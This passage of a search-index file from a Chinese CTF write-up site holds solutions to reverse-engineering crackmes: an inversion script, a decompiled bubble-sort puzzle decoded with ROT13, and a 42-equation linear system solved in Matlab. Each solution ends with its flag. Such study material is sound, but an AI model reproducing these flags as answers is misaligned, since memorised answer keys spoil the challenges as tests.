A (B / C) and D are obtained. 1 2 3 4 5 6 7 8 9 10 11 D , C = 0x16c11e3b , 0x4fe39c85 for i in range ( 3 , - 1 , - 1 ): A , B = D , D A ^= masks [ i ] tmp = ( A << 5 ) | ( A >> 27 ) A = ( 0x045d9f3b * tmp ) & ( 2 ** 32 - 1 ) A = A ^ ( A >> 16 ) D = C ^ A C = B print ( \"input =\" , int . to_bytes ( B , 4 , 'little' ) + int . to_bytes ( D , 4 , 'little' )) # input = b'Qy=*}OV('","title":"Solution"},{"location":"reverse/it_sova/#flag","text":"SAS{h00t_h00t_7h1s_6uy_w1ll_c0v3r_th3_c0st5_9f03fd}","title":"Flag"},{"location":"reverse/newsctf_re_signin/","text":"\u9898\u76ee \u00b6 count is times Hint \u00b6 \u5192\u6ce1\u6392\u5e8f\u7684\u6b21\u6570 \u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u5305\u542b\u4e24\u4e2a\u6587\u4ef6 flag.pyc \u548c flag.txt \uff0c flag.txt \u662f\u82e5\u5e72\u4e00\u7ef4\u6570\u7ec4 \u53cd\u7f16\u8bd1 PYC \u6587\u4ef6\u83b7\u5f97 PY \u6e90\u4ee3\u7801 1 uncompyle6 flag.pyc > flag.py \u5206\u6790\u4ee3\u7801\uff0c\u53d1\u73b0\u5192\u6ce1\u6392\u5e8f\uff0c\u7ed3\u5408\u9898\u76ee count is times \u53ef\u4ee5\u63a8\u6d4b c \u6570\u7ec4\u6bcf\u4e00\u4f4d\u7684\u503c\u662f\u5bf9\u5e94\u6570\u7ec4\u5192\u6ce1\u6392\u5e8f\u7684\u603b\u4ea4\u6362\u6b21\u6570\uff08\u672c\u6765\u6ca1\u6709 Hint \u7684 XD\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 flag = 'xxxx {xxxxxxxxxxxxxxxxxx} ' import random c = [ 0 ] * len ( flag ) for i in range ( len ( flag )): c [ i ] = ord ( flag [ i ]) else : print ( c ) t = 0 for i in range ( 2000 ): num = range ( 0 , 100 ) nums = random . sample ( num , 22 ) numss = nums . copy () # \u5192\u6ce1\u6392\u5e8f for i in range ( len ( nums ) - 1 ): for j in range ( len ( nums ) - i - 1 ): if nums [ j ] > nums [( j + 1 )]: nums [ j ], nums [ j + 1 ] = nums [( j + 1 )], nums [ j ] if count == c [ t ]: print ( numss ) # \u4ea4\u6362\u524d\u7684 nums \u6570\u7ec4 t += 1 if t == 24 : break \u8ba1\u7b97\u5f97 synt{jrypbzr_gb_arjfpgs} ROT13 \u53ef\u5f97 Flag\uff1a flag{welcome_to_newsctf}","title":"NEWSCTF - re_signin"},{"location":"reverse/newsctf_re_signin/#_1","text":"count is times","title":"\u9898\u76ee"},{"location":"reverse/newsctf_re_signin/#hint","text":"\u5192\u6ce1\u6392\u5e8f\u7684\u6b21\u6570","title":"Hint"},{"location":"reverse/newsctf_re_signin/#_2","text":"\u9898\u76ee\u5305\u542b\u4e24\u4e2a\u6587\u4ef6 flag.pyc \u548c flag.txt \uff0c flag.txt \u662f\u82e5\u5e72\u4e00\u7ef4\u6570\u7ec4 \u53cd\u7f16\u8bd1 PYC \u6587\u4ef6\u83b7\u5f97 PY \u6e90\u4ee3\u7801 1 uncompyle6 flag.pyc > flag.py \u5206\u6790\u4ee3\u7801\uff0c\u53d1\u73b0\u5192\u6ce1\u6392\u5e8f\uff0c\u7ed3\u5408\u9898\u76ee count is times \u53ef\u4ee5\u63a8\u6d4b c \u6570\u7ec4\u6bcf\u4e00\u4f4d\u7684\u503c\u662f\u5bf9\u5e94\u6570\u7ec4\u5192\u6ce1\u6392\u5e8f\u7684\u603b\u4ea4\u6362\u6b21\u6570\uff08\u672c\u6765\u6ca1\u6709 Hint \u7684 XD\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 flag = 'xxxx {xxxxxxxxxxxxxxxxxx} ' import random c = [ 0 ] * len ( flag ) for i in range ( len ( flag )): c [ i ] = ord ( flag [ i ]) else : print ( c ) t = 0 for i in range ( 2000 ): num = range ( 0 , 100 ) nums = random . sample ( num , 22 ) numss = nums . copy () # \u5192\u6ce1\u6392\u5e8f for i in range ( len ( nums ) - 1 ): for j in range ( len ( nums ) - i - 1 ): if nums [ j ] > nums [( j + 1 )]: nums [ j ], nums [ j + 1 ] = nums [( j + 1 )], nums [ j ] if count == c [ t ]: print ( numss ) # \u4ea4\u6362\u524d\u7684 nums \u6570\u7ec4 t += 1 if t == 24 : break \u8ba1\u7b97\u5f97 synt{jrypbzr_gb_arjfpgs} ROT13 \u53ef\u5f97 Flag\uff1a flag{welcome_to_newsctf}","title":"\u89e3\u9898\u601d\u8def"},{"location":"reverse/z3/","text":"\u9898\u76ee \u00b6 \u5e38\u89c4\u9006\u5411\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u4f7f\u7528 IDA Pro(64-bit) \u6253\u5f00 4.exe \uff0c\u67e5\u770b\u4f2a\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 _main ( * ( _QWORD * ) & argc , argv , envp ); memcpy ( Dst , & unk_404020 , 0xA8u i64 ); printf ( \"plz input your flag:\" ); scanf ( \"%42s\" , & v46 ); v4 = 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 ; v5 = 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 ; v6 = 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 ; v7 = 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 ; v8 = 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 ; v9 = 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 ; v10 = 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 ; v11 = 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 ; v12 = 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 ; v13 = 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 ; v14 = 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 ; v15 = 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 ; v16 = 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 ; v17 = 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 ; v18 = 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 ; v19 = 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 ; v20 = 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 ; v21 = 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 ; v22 = 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 ; v23 = 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 ; v24 = 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 ; v25 = 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 ; v26 = 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 ; v27 = 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 ; v28 = 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 ; v29 = 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 ; v30 = 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 ; v31 = 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 ; v32 = 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 ; v33 = 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 ; v34 = 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 ; v35 = 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 ; v36 = 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 ; v37 = 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 ; v38 = 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 ; v39 = 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 ; v40 = 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 ; v41 = 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 ; v42 = 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 ; v43 = 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 ; v44 = 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 ; v45 = 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 ; for ( i = 0 ; i <= 41 ; ++ i ) { if ( * ( & v4 + i ) != Dst [ i ] ) { printf ( \"error\" ); exit ( 0 ); } } printf ( \"win\" ); return 0 ; \u7531\u4e0a\u8ff0\u4f2a\u4ee3\u7801\u53ef\u77e5\u9700\u8981\u8fdb\u884c\u65b9\u7a0b\u7684\u6c42\u89e3\uff0c\u5176\u4e2d\u53d8\u91cf \\(v4, v5, ..., v44, v45\\) \u7684\u503c\u53ef\u7531\u5faa\u73af\u4e2d if \u8bed\u53e5\u5f97\u51fa\uff0c\u5373 \\(v4 == Dst[0]\\) \uff0c \\(v5 == Dst[1]\u2026\u2026\\) \u4ee5\u6b64\u7c7b\u63a8 Dst \u6570\u7ec4\u7684\u503c\u6765\u81ea\u53e6\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u5143\u7d20\u6570\u503c\u9006\u5e8f\u8bfb\u53d6\u5e76\u5c06\u5341\u516d\u8fdb\u5236\u8f6c\u5316\u4e3a\u5341\u8fdb\u5236 1 memcpy ( Dst , & unk_404020 , 0xA8u i64 ); \u4f7f\u7528 Matlab \u8fdb\u884c\u65b9\u7a0b\u7684\u6c42\u89e3 1 2 syms v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21 v22 v23 v24 v25 v26 v27 v28 v29 v30 v31 v32 v33 v34 v35 v36 v37 v38 v39 v40 v41 v42 v43 v44 v45 v46 v47 v48 v49 v50 v51 v52 v53 v54 v55 v56 v57 v58 v59 v60 v61 v62 v63 v64 v65 v66 v67 v68 v69 v70 v71 v72 v73 v74 v75 v76 v77 v78 v79 v80 v81 v82 v83 v84 v85 v86 v87 [ v4 , v5 , v6 , v7 , v8 , v9 , v10 , v11 , v12 , v13 , v14 , v15 , v16 , v17 , v18 , v19 , v20 , v21 , v22 , v23 , v24 , v25 , v26 , v27 , v28 , v29 , v30 , v31 , v32 , v33 , v34 , v35 , v36 , v37 , v38 , v39 , v40 , v41 , v42 , v43 , v44 , v45 , v46 , v47 , v48 , v49 , v50 , v51 , v52 , v53 , v54 , v55 , v56 , v57 , v58 , v59 , v60 , v61 , v62 , v63 , v64 , v65 , v66 , v67 , v68 , v69 , v70 , v71 , v72 , v73 , v74 , v75 , v76 , v77 , v78 , v79 , v80 , v81 , v82 , v83 , v84 , v85 , v86 , v87 ] = solve ( v4 == 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 , v5 == 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 , v6 == 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 , v7 == 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 , v8 == 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 , v9 == 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 , v10 == 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 , v11 == 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 , v12 == 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 , v13 == 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 , v14 == 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 , v15 == 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 , v16 == 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 , v17 == 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 , v18 == 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 , v19 == 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 , v20 == 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 , v21 == 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 , v22 == 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 , v23 == 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 , v24 == 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 , v25 == 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 , v26 == 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 , v27 == 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 , v28 == 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 , v29 == 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 , v30 == 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 , v31 == 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 , v32 == 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 , v33 == 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 , v34 == 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 , v35 == 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 , v36 == 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 , v37 == 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 , v38 == 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 , v39 == 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 , v40 == 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 , v41 == 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 , v42 == 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 , v43 == 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 , v44 == 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 , v45 == 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 , v4 == 20247 , v5 == 40182 , v6 == 36315 , v7 == 36518 , v8 == 26921 , v9 == 39185 , v10 == 16546 , v11 == 12094 , v12 == 25270 , v13 == 19330 , v14 == 18540 , v15 == 16386 , v16 == 21207 , v17 == 11759 , v18 == 10460 , v19 == 25613 , v20 == 21135 , v21 == 24891 , v22 == 18305 , v23 == 27415 , v24 == 12855 , v25 == 10899 , v26 == 24927 , v27 == 20670 , v28 == 22926 , v29 == 18006 , v30 == 23345 , v31 == 12602 , v32 == 12304 , v33 == 26622 , v34 == 19807 , v35 == 22747 , v36 == 14233 , v37 == 24736 , v38 == 10064 , v39 == 14169 , v40 == 35155 , v41 == 28962 , v42 == 33273 , v43 == 21796 , v44 == 35185 , v45 == 14877 ) \u6c42\u89e3\u540e\uff0c\u5c06\u53d8\u91cf \\(v46, v47, ..., v86, v87\\) \u7684\u503c\u8f6c\u6362\u4e3a ASCII \u7801\u5373\u53ef\u83b7\u5f97 FLAG\u3010\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\u5e76\u8f93\u5165 \\(v46\\) \u7684\u503c\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4ecd\u7136\u662f error \u3011","title":"z3"},{"location":"reverse/z3/#_1","text":"\u5e38\u89c4\u9006\u5411\u3002","title":"\u9898\u76ee"},{"location":"reverse/z3/#_2","text":"\u4f7f\u7528 IDA Pro(64-bit) \u6253\u5f00 4.exe \uff0c\u67e5\u770b\u4f2a\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 _main ( * ( _QWORD * ) & argc , argv , envp ); memcpy ( Dst , & unk_404020 , 0xA8u i64 ); printf ( \"plz input your flag:\" ); scanf ( \"%42s\" , & v46 ); v4 = 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 ; v5 = 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 ; v6 = 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 ; v7 = 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 ; v8 = 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 ; v9 = 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 ; v10 = 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 ; v11 = 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 ; v12 = 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 ; v13 = 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 ; v14 = 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 ; v15 = 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 ; v16 = 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 ; v17 = 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 ; v18 = 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 ; v19 = 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 ; v20 = 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 ; v21 = 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 ; v22 = 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 ; v23 = 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 ; v24 = 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 ; v25 = 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 ; v26 = 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 ; v27 = 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 ; v28 = 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 ; v29 = 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 ; v30 = 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 ; v31 = 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 ; v32 = 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 ; v33 = 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 ; v34 = 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 ; v35 = 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 ; v36 = 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 ; v37 = 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 ; v38 = 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 ; v39 = 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 ; v40 = 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 ; v41 = 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 ; v42 = 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 ; v43 = 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 ; v44 = 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 ; v45 = 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 ; for ( i = 0 ; i <= 41 ; ++ i ) { if ( * ( & v4 + i ) != Dst [ i ] ) { printf ( \"error\" ); exit ( 0 ); } } printf ( \"win\" ); return 0 ; \u7531\u4e0a\u8ff0\u4f2a\u4ee3\u7801\u53ef\u77e5\u9700\u8981\u8fdb\u884c\u65b9\u7a0b\u7684\u6c42\u89e3\uff0c\u5176\u4e2d\u53d8\u91cf \\(v4, v5, ..., v44, v45\\) \u7684\u503c\u53ef\u7531\u5faa\u73af\u4e2d if \u8bed\u53e5\u5f97\u51fa\uff0c\u5373 \\(v4 == Dst[0]\\) \uff0c \\(v5 == Dst[1]\u2026\u2026\\) \u4ee5\u6b64\u7c7b\u63a8 Dst \u6570\u7ec4\u7684\u503c\u6765\u81ea\u53e6\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u5143\u7d20\u6570\u503c\u9006\u5e8f\u8bfb\u53d6\u5e76\u5c06\u5341\u516d\u8fdb\u5236\u8f6c\u5316\u4e3a\u5341\u8fdb\u5236 1 memcpy ( Dst , & unk_404020 , 0xA8u i64 ); \u4f7f\u7528 Matlab \u8fdb\u884c\u65b9\u7a0b\u7684\u6c42\u89e3 1 2 syms v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21 v22 v23 v24 v25 v26 v27 v28 v29 v30 v31 v32 v33 v34 v35 v36 v37 v38 v39 v40 v41 v42 v43 v44 v45 v46 v47 v48 v49 v50 v51 v52 v53 v54 v55 v56 v57 v58 v59 v60 v61 v62 v63 v64 v65 v66 v67 v68 v69 v70 v71 v72 v73 v74 v75 v76 v77 v78 v79 v80 v81 v82 v83 v84 v85 v86 v87 [ v4 , v5 , v6 , v7 , v8 , v9 , v10 , v11 , v12 , v13 , v14 , v15 , v16 , v17 , v18 , v19 , v20 , v21 , v22 , v23 , v24 , v25 , v26 , v27 , v28 , v29 , v30 , v31 , v32 , v33 , v34 , v35 , v36 , v37 , v38 , v39 , v40 , v41 , v42 , v43 , v44 , v45 , v46 , v47 , v48 , v49 , v50 , v51 , v52 , v53 , v54 , v55 , v56 , v57 , v58 , v59 , v60 , v61 , v62 , v63 , v64 , v65 , v66 , v67 , v68 , v69 , v70 , v71 , v72 , v73 , v74 , v75 , v76 , v77 , v78 , v79 , v80 , v81 , v82 , v83 , v84 , v85 , v86 , v87 ] = solve ( v4 == 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 , v5 == 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 , v6 == 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 , v7 == 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 , v8 == 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 , v9 == 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 , v10 == 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 , v11 == 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 , v12 == 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 , v13 == 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 , v14 == 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 , v15 == 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 , v16 == 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 , v17 == 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 , v18 == 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 , v19 == 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 , v20 == 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 , v21 == 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 , v22 == 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 , v23 == 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 , v24 == 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 , v25 == 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 , v26 == 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 , v27 == 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 , v28 == 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 , v29 == 48 * v71 + 14 * v69 + 